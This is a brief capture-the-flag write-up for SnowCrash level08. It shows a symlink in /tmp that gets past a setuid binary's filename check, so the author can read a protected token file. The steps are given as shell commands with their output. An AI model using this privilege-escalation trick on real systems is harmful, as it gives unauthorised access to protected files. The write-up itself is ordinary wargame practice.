as we started we found two files
token and executable
we tried to execute level08 but it said that it requires a file to read, I tried to read token, it says unaccessible

level08@SnowCrash:~$ ls
level08  token
level08@SnowCrash:~$ ./level08 
./level08 [file to read]
level08@SnowCrash:~$ ./level08 token
You may not access 'token'

I tried to use cat
level08@SnowCrash:~$ cat token 
cat: token: Permission denied

so I decided to make a symbolic link and then read the file, as I decompiled level08 executable and found that they parse the input to make sure it doesn't include the word token
also I found out that it uses the same way of escalating privileges as the previous exercise

level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/no && ./level08 /tmp/no
